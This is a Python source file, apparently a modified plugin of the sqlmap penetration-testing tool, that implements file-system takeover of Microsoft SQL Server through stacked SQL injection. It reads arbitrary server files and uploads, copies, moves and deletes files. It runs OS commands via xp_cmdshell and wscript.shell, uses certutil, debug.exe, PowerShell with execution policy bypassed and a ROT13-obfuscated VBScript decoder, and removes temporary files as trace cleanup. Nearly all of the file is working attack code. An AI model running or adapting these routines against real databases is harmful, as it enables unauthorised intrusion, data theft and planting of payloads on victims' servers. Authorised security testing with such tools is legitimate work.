#!/usr/bin/env python

"""
Copyright (c) 2006-2025 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import ntpath
import os

import binascii
from lib.core.common import flattenValue
from lib.core.common import isListLike
from lib.core.enums import DBMS
from lib.core.common import Backend
from lib.core.common import checkFile
from lib.core.common import getLimitRange
from lib.core.common import isNumPosStrValue
from lib.core.common import isTechniqueAvailable
from lib.core.common import posixToNtSlashes
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.compat import xrange
from lib.core.convert import encodeBase64
from lib.core.convert import encodeHex
from lib.core.convert import rot13
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import CHARSET_TYPE
from lib.core.enums import EXPECTED
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapNoneDataException
from lib.core.exception import SqlmapUnsupportedFeatureException
from lib.request import inject
from lib.core.enums import HTTPMETHOD
from plugins.generic.filesystem import Filesystem as GenericFilesystem
from lib.core.common import getSQLSnippet
from lib.core.agent import agent

class Filesystem(GenericFilesystem):
    def _dataToScr(self, fileContent, chunkName):
        fileLines = []
        fileSize = len(fileContent)
        lineAddr = 0x100
        lineLen = 20

        fileLines.append("n %s" % chunkName)
        fileLines.append("rcx")
        fileLines.append("%x" % fileSize)
        fileLines.append("f 0100 %x 00" % fileSize)

        for fileLine in xrange(0, len(fileContent), lineLen):
            scrString = ""

            for lineChar in fileContent[fileLine:fileLine + lineLen]:
                strLineChar = encodeHex(lineChar, binary=False)

                if not scrString:
                    scrString = "e %x %s" % (lineAddr, strLineChar)
                else:
                    scrString += " %s" % strLineChar

                lineAddr += len(strLineChar) // 2

            fileLines.append(scrString)

        fileLines.append("w")
        fileLines.append("q")

        return fileLines

    def _updateDestChunk(self, fileContent, tmpPath):
        randScr = "tmpf%s.scr" % randomStr(lowercase=True)
        chunkName = randomStr(lowercase=True)
        fileScrLines = self._dataToScr(fileContent, chunkName)

        logger.debug("uploading debug script to %s\\%s, please wait.." % (tmpPath, randScr))

        self.xpCmdshellWriteFile(fileScrLines, tmpPath, randScr)

        logger.debug("generating chunk file %s\\%s from debug script %s" % (tmpPath, chunkName, randScr))

        commands = (
            "cd \"%s\"" % tmpPath,
            "debug < %s" % randScr,
            "del /F /Q %s" % randScr
        )

        self.execCmd(" & ".join(command for command in commands))

        return chunkName
    def clrStackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "fetching file: '%s'" % remoteFile
            logger.info(infoMsg)

        result = []
        if Backend.isDbms(DBMS.MSSQL):
            result = []

            hexTbl = "%s%shex" % (self.fileTblName, randomStr())
            inject.goStacked("DROP TABLE %s" % hexTbl)
            inject.goStacked(
                "declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'c:\\windows\\temp\\clreadtest.txt';create table %s(data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into %s(data) values(@data);" % (
                hexTbl, hexTbl))
            # lengthQuery = "SELECT DATALENGTH(%s) FROM %s" % (self.tblField, self.fileTblName)
            # remoteFileSize = inject.getValue(lengthQuery, resumeValue=False, expected=EXPECTED.INT,
            #                                  charsetType=CHARSET_TYPE.DIGITS)
            """
            create table clrsqlfile(data VARBINARY(MAX));
            INSERT INTO clrsqlfile (data) SELECT * FROM OPENROWSET(BULK N'c:\\windows\\temp\\1.txt', SINGLE_BLOB) rs 
            """

        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
            result = inject.getValue("select data from %s"%(hexTbl))

        if not result:
            result = []
            tblField = 'data'
            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if not isNumPosStrValue(count):
                errMsg = "unable to retrieve the content of the "
                errMsg += "file '%s'" % remoteFile
                raise SqlmapNoneDataException(errMsg)

            indexRange = getLimitRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (tblField, hexTbl, tblField, index, tblField, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % (hexTbl))

        return result

    def stackedReadFile(self, remoteFile):
        if not kb.bruteMode:
            infoMsg = "fetching file: '%s'" % remoteFile
            logger.info(infoMsg)

        result = []
        txtTbl = self.fileTblName
        hexTbl = "%s%shex" % (self.fileTblName, randomStr())

        self.createSupportTbl(txtTbl, self.tblField, "text")
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked("CREATE TABLE %s(id INT IDENTITY(1, 1) PRIMARY KEY, %s %s)" % (hexTbl, self.tblField, "VARCHAR(4096)"))

        logger.debug("loading the content of file '%s' into support table" % remoteFile)
        inject.goStacked("BULK INSERT %s FROM '%s' WITH (CODEPAGE='RAW', FIELDTERMINATOR='%s', ROWTERMINATOR='%s')" % (txtTbl, remoteFile, randomStr(10), randomStr(10)), silent=True)

        # Reference: https://web.archive.org/web/20120211184457/http://support.microsoft.com/kb/104829
        binToHexQuery = """DECLARE @charset VARCHAR(16)
        DECLARE @counter INT
        DECLARE @hexstr VARCHAR(4096)
        DECLARE @length INT
        DECLARE @chunk INT

        SET @charset = '0123456789ABCDEF'
        SET @counter = 1
        SET @hexstr = ''
        SET @length = (SELECT DATALENGTH(%s) FROM %s)
        SET @chunk = 1024

        WHILE (@counter <= @length)
        BEGIN
            DECLARE @tempint INT
            DECLARE @firstint INT
            DECLARE @secondint INT

            SET @tempint = CONVERT(INT, (SELECT ASCII(SUBSTRING(%s, @counter, 1)) FROM %s))
            SET @firstint = floor(@tempint/16)
            SET @secondint = @tempint - (@firstint * 16)
            SET @hexstr = @hexstr + SUBSTRING(@charset, @firstint+1, 1) + SUBSTRING(@charset, @secondint+1, 1)

            SET @counter = @counter + 1

            IF @counter %% @chunk = 0
            BEGIN
                INSERT INTO %s(%s) VALUES(@hexstr)
                SET @hexstr = ''
            END
        END

        IF @counter %% (@chunk) != 0
        BEGIN
            INSERT INTO %s(%s) VALUES(@hexstr)
        END
        """ % (self.tblField, txtTbl, self.tblField, txtTbl, hexTbl, self.tblField, hexTbl, self.tblField)

        binToHexQuery = binToHexQuery.replace("    ", "").replace("\n", " ")
        inject.goStacked(binToHexQuery)

        if isTechniqueAvailable(PAYLOAD.TECHNIQUE.UNION):
            result = inject.getValue("SELECT %s FROM %s ORDER BY id ASC" % (self.tblField, hexTbl), resumeValue=False, blind=False, time=False, error=False)

        if not result:
            result = []
            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT, charsetType=CHARSET_TYPE.DIGITS)

            if not isNumPosStrValue(count):
                errMsg = "unable to retrieve the content of the "
                errMsg += "file '%s'" % remoteFile
                raise SqlmapNoneDataException(errMsg)

            indexRange = getLimitRange(count)

            for index in indexRange:
                chunk = inject.getValue("SELECT TOP 1 %s FROM %s WHERE %s NOT IN (SELECT TOP %d %s FROM %s ORDER BY id ASC) ORDER BY id ASC" % (self.tblField, hexTbl, self.tblField, index, self.tblField, hexTbl), unpack=False, resumeValue=False, charsetType=CHARSET_TYPE.HEXADECIMAL)
                result.append(chunk)

        inject.goStacked("DROP TABLE %s" % hexTbl)

        return result

    def unionWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        errMsg = "Microsoft SQL Server does not support file upload with "
        errMsg += "UNION query SQL injection technique"
        raise SqlmapUnsupportedFeatureException(errMsg)

    def _stackedWriteFilePS(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = "using PowerShell to write the %s file content " % fileType
        infoMsg += "to file '%s'" % remoteFile
        logger.info(infoMsg)

        encodedFileContent = encodeBase64(localFileContent, binary=False)
        encodedBase64File = "tmpf%s.txt" % randomStr(lowercase=True)
        encodedBase64FilePath = "%s\\%s" % (tmpPath, encodedBase64File)

        randPSScript = "tmpps%s.ps1" % randomStr(lowercase=True)
        randPSScriptPath = "%s\\%s" % (tmpPath, randPSScript)

        localFileSize = len(encodedFileContent)
        chunkMaxSize = 1024

        logger.debug("uploading the base64-encoded file to %s, please wait.." % encodedBase64FilePath)

        for i in xrange(0, localFileSize, chunkMaxSize):
            wEncodedChunk = encodedFileContent[i:i + chunkMaxSize]
            self.xpCmdshellWriteFile(wEncodedChunk, tmpPath, encodedBase64File)

        psString = "$Base64 = Get-Content -Path \"%s\"; " % encodedBase64FilePath
        psString += "$Base64 = $Base64 -replace \"`t|`n|`r\",\"\"; $Content = "
        psString += "[System.Convert]::FromBase64String($Base64); Set-Content "
        psString += "-Path \"%s\" -Value $Content -Encoding Byte" % remoteFile

        logger.debug("uploading the PowerShell base64-decoding script to %s" % randPSScriptPath)
        self.xpCmdshellWriteFile(psString, tmpPath, randPSScript)

        logger.debug("executing the PowerShell base64-decoding script to write the %s file, please wait.." % remoteFile)

        commands = (
            "powershell -ExecutionPolicy ByPass -File \"%s\"" % randPSScriptPath,
            "del /F /Q \"%s\"" % encodedBase64FilePath,
            "del /F /Q \"%s\"" % randPSScriptPath
        )

        self.execCmd(" & ".join(command for command in commands))

    def oleDelFile(self,path_name):
        inject.goStacked('declare @result int;declare @ffffffff0x int;exec sp_oacreate \'scripting.filesystemobject\', @ffffffff0x out;exec sp_oamethod @ffffffff0x,\'deletefile\',null,\'{path_name}\';exec sp_oadestroy @ffffffff0x'.format(path_name=path_name))
        print('delete file may be success')
        print('已执行文件删除命令，请自行判断是否成功，用户在目标目录无修改权限会执行失败')

    def oleMoveFile(self,path_name1,path_name2):
        inject.goStacked(
            'declare @ffffffff0x int;exec sp_oacreate \'scripting.filesystemobject\',@ffffffff0x out;exec sp_oamethod @ffffffff0x,\'movefile\',null,\'{path_name1}\',\'{path_name2}\';'.format(
            path_name1=path_name1, path_name2=path_name2))
        print('move file may be success')
        print('已执行文件移动命令，请自行判断是否成功，用户在目标目录无修改权限会执行失败')

    def oleCopyFile(self,path_name1,path_name2):
        inject.goStacked(
            'declare @ffffffff0x int;exec sp_oacreate \'scripting.filesystemobject\', @ffffffff0x out;exec sp_oamethod @ffffffff0x,\'copyfile\',null,\'{path_name1}\',\'{path_name2}\';'.format(
                path_name1=path_name1,path_name2=path_name2))
        print('copy file may be success')
        print('已执行文件复制命令，请自行判断是否成功，用户在目标目录无修改权限会执行失败')

    def oleReadFile(self,path_name):
        self.tblField = 'data'
        activate = getSQLSnippet(DBMS.MSSQL, "activate_sp_oacreate")
        inject.goStacked(agent.runAsDBMSUser(activate))
        output = None
        hexTbl = "%s%shex" % (self.fileTblName, randomStr())
        inject.goStacked("DROP TABLE %s" % hexTbl)
        inject.goStacked(
            "declare @object int;declare @file int;declare @data varchar(8000);exec [master]..[sp_oacreate] 'scripting.filesystemobject',@object out;exec [master]..[sp_oamethod] @object,'OpenTextFile',@file output,'{path_name}';create table {hexTbl}(data varchar(8000));exec [master]..[sp_oamethod] @file,'read',@data out,8000;insert into {hexTbl}(data) values(@data);".format(
                hexTbl=hexTbl,path_name=path_name) )

        query = "SELECT %s FROM %s" % (self.tblField, hexTbl)

        if any(isTechniqueAvailable(_) for _ in
               (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
            output = inject.getValue(query, resumeValue=False, blind=False, time=False)

            if output :
                print("读取的文件内容：" + output)


        if (output is None) or len(output) == 0 or output[0] is None:
            output = []

            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT,
                                    charsetType=CHARSET_TYPE.DIGITS)

            if isNumPosStrValue(count):
                for index in getLimitRange(count):
                    query = agent.limitQuery(index, query, self.tblField)
                    output.append(inject.getValue(query, union=False, error=False, resumeValue=False))

        inject.goStacked("DELETE FROM %s" % hexTbl)
        inject.goStacked("DROP TABLE %s" % hexTbl)
        if output and isListLike(output) and len(output) > 1:
            _ = ""
            lines = [line for line in flattenValue(output) if line is not None]

            for i in xrange(len(lines)):
                line = lines[i] or ""
                if line is None or i in (0, len(lines) - 1) and not line.strip():
                    continue
                _ += "%s\n" % line

            output = _.rstrip('\n')

        return output

    def xpCheckFile(self,path_name):
        self.tblField = 'data'
        output = None
        count = 0
        hexTbl = "%s%shex" % (self.fileTblName, randomStr())
        inject.goStacked('declare @result int=0;declare @path nvarchar(200)=\'{path_name}\';EXEC master.dbo.xp_fileexist @path ,@result output;create table {table_name}(data varchar(8000));insert into {table_name}(data) values(@result);'.format(table_name=hexTbl,path_name=path_name))
        query = "SELECT %s FROM %s" % (self.tblField, hexTbl)
        if any(isTechniqueAvailable(_) for _ in (PAYLOAD.TECHNIQUE.UNION, PAYLOAD.TECHNIQUE.ERROR, PAYLOAD.TECHNIQUE.QUERY)) or conf.direct:
            output = inject.getValue(query, resumeValue=False, blind=False, time=False)

        if (output is None) or len(output) == 0 or output[0] is None:
            output = []
            count = inject.getValue("SELECT COUNT(*) FROM %s" % (hexTbl), resumeValue=False, expected=EXPECTED.INT,
                                    charsetType=CHARSET_TYPE.DIGITS)

        inject.goStacked("DELETE FROM %s" % hexTbl)
        inject.goStacked("DROP TABLE %s" % hexTbl)

        if output == '1' or str(count) == '1':
            print('Target file exists')
            print("目标文件存在")
        else:
            print('The target file does not exist')
            print("目标文件不存在")

        return


    def xpCmdUpload(self,localFile,remoteFile):
        print('Local File Path : '+localFile)
        print('Remote File Path : '+remoteFile)
        checkFile(localFile)
        file = open(localFile, "rb")

        payload1 = 'cd . > "{}"'.format(remoteFile + '.tmp')
        inject.goStacked('DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x%s;EXEC master..xp_cmdshell @bjxl' %binascii.hexlify(
            payload1.encode()).decode())
        while 1:
            content = file.read(128)
            payload2 = '''>>"{path}" set /p="{content}"<nul'''.format(path=remoteFile + '.tmp', content=binascii.hexlify(content).decode())
            inject.goStacked('DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x%s;EXEC master..xp_cmdshell @bjxl' %binascii.hexlify(
            payload2.encode()).decode())
            if len(content) < 128:
                break
        payload3 = 'certUtil -decodehex "{old_path}" "{new_path}"'.format(old_path=remoteFile + '.tmp',
                                                                                new_path=remoteFile)
        inject.goStacked('DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x%s;EXEC master..xp_cmdshell @bjxl' % binascii.hexlify(
            payload3.encode()).decode())
        payload4 = 'del /f "{}"'.format(remoteFile.replace("/", "\\") + '.tmp')
        inject.goStacked('DECLARE @bjxl VARCHAR(8000);SET @bjxl=0x%s;EXEC master..xp_cmdshell @bjxl' % binascii.hexlify(
            payload4.encode()).decode())
        print('The file upload process has ended. You can use --check-file to determine if the upload was successful')
        print('文件上传流程结束，可使用--check-file判断上传是否成功')

    def oleUpload(self,localFile,remoteFile):
        print('Local File: '+localFile)
        print('Remote File: ' + remoteFile)
        checkFile(localFile)
        s = open(localFile, 'rb').read()
        content = binascii.hexlify(s).decode()

        l = [content[i:i + 150000] for i in range(0, len(content), 150000)]
        print(len(l))
        if conf.method == HTTPMETHOD.POST:
            for n, i in enumerate(l):
                inject.goStacked(
                    "DECLARE @ObjectToken INT;EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT;""EXEC sp_OASetProperty @ObjectToken, 'Type', 1;EXEC sp_OAMethod @ObjectToken, 'Open';""EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{content};EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, ""'{remoteFile}', 2;EXEC sp_OAMethod @ObjectToken, 'Close';EXEC sp_OADestroy @ObjectToken;".format(
                        index=n, content=i, remoteFile=remoteFile))

            print('The file upload process has ended. You can use --check-file to determine if the upload was successful')
            print('文件上传流程结束，可使用--check-file判断上传是否成功')
            return
        l = [content[i:i + 256] for i in range(0, len(content), 256)]
        for n, i in enumerate(l):
            inject.goStacked(
                "DECLARE @ObjectToken INT;EXEC sp_OACreate 'ADODB.Stream', @ObjectToken OUTPUT;""EXEC sp_OASetProperty @ObjectToken, 'Type', 1;EXEC sp_OAMethod @ObjectToken, 'Open';""EXEC sp_OAMethod @ObjectToken, 'Write', NULL, 0x{content};EXEC sp_OAMethod @ObjectToken, 'SaveToFile', NULL, ""'{remoteFile}_{index}', 2;EXEC sp_OAMethod @ObjectToken, 'Close';EXEC sp_OADestroy @ObjectToken;".format(
                    index=n, content=i, remoteFile=remoteFile))

        for i in range(len(l) - 2):

            if i == 0:
                inject.goStacked(
                    "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}+{}_{} {}_{}_tmp'".format(
                        remoteFile, i, remoteFile, i + 1, remoteFile, i + 1
                    ))
            else:
                inject.goStacked(
                    "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}_tmp+{}_{} {}_{}_tmp'".format(
                        remoteFile, i, remoteFile, i + 1, remoteFile, i + 1
                    ))

        # 合并文件
        if len(l) > 2:
            inject.goStacked(
                "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}_tmp+{}_{} {}'".format(
                    remoteFile, len(l) - 2, remoteFile, len(l) - 1, remoteFile
                ))
        else:
            inject.goStacked(
                "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c copy /b {}_{}_tmp+{}_{} {}'".format(
                    remoteFile, len(l) - 1, remoteFile, len(l), remoteFile
                ))

        # 清理痕迹
        inject.goStacked(
            "DECLARE @SHELL INT;EXEC sp_oacreate 'wscript.shell', @SHELL OUTPUT;EXEC sp_oamethod @SHELL, 'run' , NULL, 'c:\\windows\\system32\\cmd.exe /c del {}_*'".format(remoteFile))
        print('The file upload process has ended. You can use --check-file to determine if the upload was successful')
        print('文件上传流程结束，可使用--check-file判断上传是否成功')



    def _stackedWriteFileDebugExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = "using debug.exe to write the %s " % fileType
        infoMsg += "file content to file '%s', please wait.." % remoteFile
        logger.info(infoMsg)

        remoteFileName = ntpath.basename(remoteFile)
        sFile = "%s\\%s" % (tmpPath, remoteFileName)
        localFileSize = os.path.getsize(localFile)
        debugSize = 0xFF00

        if localFileSize < debugSize:
            chunkName = self._updateDestChunk(localFileContent, tmpPath)

            debugMsg = "renaming chunk file %s\\%s to %s " % (tmpPath, chunkName, fileType)
            debugMsg += "file %s\\%s and moving it to %s" % (tmpPath, remoteFileName, remoteFile)
            logger.debug(debugMsg)

            commands = (
                "cd \"%s\"" % tmpPath,
                "ren %s %s" % (chunkName, remoteFileName),
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))
        else:
            debugMsg = "the file is larger than %d bytes. " % debugSize
            debugMsg += "sqlmap will split it into chunks locally, upload "
            debugMsg += "it chunk by chunk and recreate the original file "
            debugMsg += "on the server, please wait.."
            logger.debug(debugMsg)

            for i in xrange(0, localFileSize, debugSize):
                localFileChunk = localFileContent[i:i + debugSize]
                chunkName = self._updateDestChunk(localFileChunk, tmpPath)

                if i == 0:
                    debugMsg = "renaming chunk "
                    copyCmd = "ren %s %s" % (chunkName, remoteFileName)
                else:
                    debugMsg = "appending chunk "
                    copyCmd = "copy /B /Y %s+%s %s" % (remoteFileName, chunkName, remoteFileName)

                debugMsg += "%s\\%s to %s file %s\\%s" % (tmpPath, chunkName, fileType, tmpPath, remoteFileName)
                logger.debug(debugMsg)

                commands = (
                    "cd \"%s\"" % tmpPath,
                    copyCmd,
                    "del /F /Q %s" % chunkName
                )

                self.execCmd(" & ".join(command for command in commands))

            logger.debug("moving %s file %s to %s" % (fileType, sFile, remoteFile))

            commands = (
                "cd \"%s\"" % tmpPath,
                "move /Y %s %s" % (remoteFileName, remoteFile)
            )

            self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileVbs(self, tmpPath, localFileContent, remoteFile, fileType):
        infoMsg = "using a custom visual basic script to write the "
        infoMsg += "%s file content to file '%s', please wait.." % (fileType, remoteFile)
        logger.info(infoMsg)

        randVbs = "tmps%s.vbs" % randomStr(lowercase=True)
        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        vbs = """Qvz vachgSvyrCngu, bhgchgSvyrCngu
        vachgSvyrCngu = "%f"
        bhgchgSvyrCngu = "%f"
        Frg sf = PerngrBowrpg("Fpevcgvat.SvyrFlfgrzBowrpg")
        Frg svyr = sf.TrgSvyr(vachgSvyrCngu)
        Vs svyr.Fvmr Gura
            Jfpevcg.Rpub "Ybnqvat sebz: " & vachgSvyrCngu
            Jfpevcg.Rpub
            Frg sq = sf.BcraGrkgSvyr(vachgSvyrCngu, 1)
            qngn = sq.ErnqNyy
            sq.Pybfr
            qngn = Ercynpr(qngn, " ", "")
            qngn = Ercynpr(qngn, ioPe, "")
            qngn = Ercynpr(qngn, ioYs, "")
            Jfpevcg.Rpub "Svkrq Vachg: "
            Jfpevcg.Rpub qngn
            Jfpevcg.Rpub
            qrpbqrqQngn = onfr64_qrpbqr(qngn)
            Jfpevcg.Rpub "Bhgchg: "
            Jfpevcg.Rpub qrpbqrqQngn
            Jfpevcg.Rpub
            Jfpevcg.Rpub "Jevgvat bhgchg va: " & bhgchgSvyrCngu
            Jfpevcg.Rpub
            Frg bsf = PerngrBowrpg("Fpevcgvat.SvyrFlfgrzBowrpg").BcraGrkgSvyr(bhgchgSvyrCngu, 2, Gehr)
            bsf.Jevgr qrpbqrqQngn
            bsf.pybfr
        Ryfr
            Jfpevcg.Rpub "Gur svyr vf rzcgl."
        Raq Vs
        Shapgvba onfr64_qrpbqr(olIny fgeVa)
            Qvz j1, j2, j3, j4, a, fgeBhg
            Sbe a = 1 Gb Yra(fgeVa) Fgrc 4
                j1 = zvzrqrpbqr(Zvq(fgeVa, a, 1))
                j2 = zvzrqrpbqr(Zvq(fgeVa, a + 1, 1))
                j3 = zvzrqrpbqr(Zvq(fgeVa, a + 2, 1))
                j4 = zvzrqrpbqr(Zvq(fgeVa, a + 3, 1))
                Vs Abg j2 Gura _
                fgeBhg = fgeBhg + Pue(((j1 * 4 + Vag(j2 / 16)) Naq 255))
                Vs  Abg j3 Gura _
                fgeBhg = fgeBhg + Pue(((j2 * 16 + Vag(j3 / 4)) Naq 255))
                Vs Abg j4 Gura _
                fgeBhg = fgeBhg + Pue(((j3 * 64 + j4) Naq 255))
            Arkg
            onfr64_qrpbqr = fgeBhg
            Raq Shapgvba
        Shapgvba zvzrqrpbqr(olIny fgeVa)
            Onfr64Punef = "NOPQRSTUVWXYZABCDEFGHIJKLMnopqrstuvwxyzabcdefghijklm0123456789+/"
            Vs Yra(fgeVa) = 0 Gura
                zvzrqrpbqr = -1 : Rkvg Shapgvba
            Ryfr
                zvzrqrpbqr = VaFge(Onfr64Punef, fgeVa) - 1
            Raq Vs
        Raq Shapgvba"""

        # NOTE: https://github.com/sqlmapproject/sqlmap/issues/5581
        vbs = rot13(vbs)
        vbs = vbs.replace("    ", "")
        encodedFileContent = encodeBase64(localFileContent, binary=False)

        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)

        self.xpCmdshellWriteFile(encodedFileContent, tmpPath, randFile)

        logger.debug("uploading a visual basic decoder stub %s\\%s, please wait.." % (tmpPath, randVbs))

        self.xpCmdshellWriteFile(vbs, tmpPath, randVbs)

        commands = (
            "cd \"%s\"" % tmpPath,
            "cscript //nologo %s" % randVbs,
            "del /F /Q %s" % randVbs,
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def _stackedWriteFileCertutilExe(self, tmpPath, localFile, localFileContent, remoteFile, fileType):
        infoMsg = "using certutil.exe to write the %s " % fileType
        infoMsg += "file content to file '%s', please wait.." % remoteFile
        logger.info(infoMsg)

        chunkMaxSize = 500

        randFile = "tmpf%s.txt" % randomStr(lowercase=True)
        randFilePath = "%s\\%s" % (tmpPath, randFile)

        encodedFileContent = encodeBase64(localFileContent, binary=False)

        splittedEncodedFileContent = '\n'.join([encodedFileContent[i:i + chunkMaxSize] for i in xrange(0, len(encodedFileContent), chunkMaxSize)])

        logger.debug("uploading the file base64-encoded content to %s, please wait.." % randFilePath)

        self.xpCmdshellWriteFile(splittedEncodedFileContent, tmpPath, randFile)

        logger.debug("decoding the file to %s.." % remoteFile)

        commands = (
            "cd \"%s\"" % tmpPath,
            "certutil -f -decode %s %s" % (randFile, remoteFile),
            "del /F /Q %s" % randFile
        )

        self.execCmd(" & ".join(command for command in commands))

    def stackedWriteFile(self, localFile, remoteFile, fileType, forceCheck=False):
        # NOTE: this is needed here because we use xp_cmdshell extended
        # procedure to write a file on the back-end Microsoft SQL Server
        # file system
        self.initEnv()
        self.getRemoteTempPath()

        tmpPath = posixToNtSlashes(conf.tmpPath)
        remoteFile = posixToNtSlashes(remoteFile)

        checkFile(localFile)
        localFileContent = open(localFile, "rb").read()

        self._stackedWriteFilePS(tmpPath, localFileContent, remoteFile, fileType)
        written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "do you want to try to upload the file with "
            message += "the custom Visual Basic script technique? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileVbs(tmpPath, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "do you want to try to upload the file with "
            message += "the built-in debug.exe technique? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileDebugExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        if written is False:
            message = "do you want to try to upload the file with "
            message += "the built-in certutil.exe technique? [Y/n] "

            if readInput(message, default='Y', boolean=True):
                self._stackedWriteFileCertutilExe(tmpPath, localFile, localFileContent, remoteFile, fileType)
                written = self.askCheckWrittenFile(localFile, remoteFile, forceCheck)

        return written
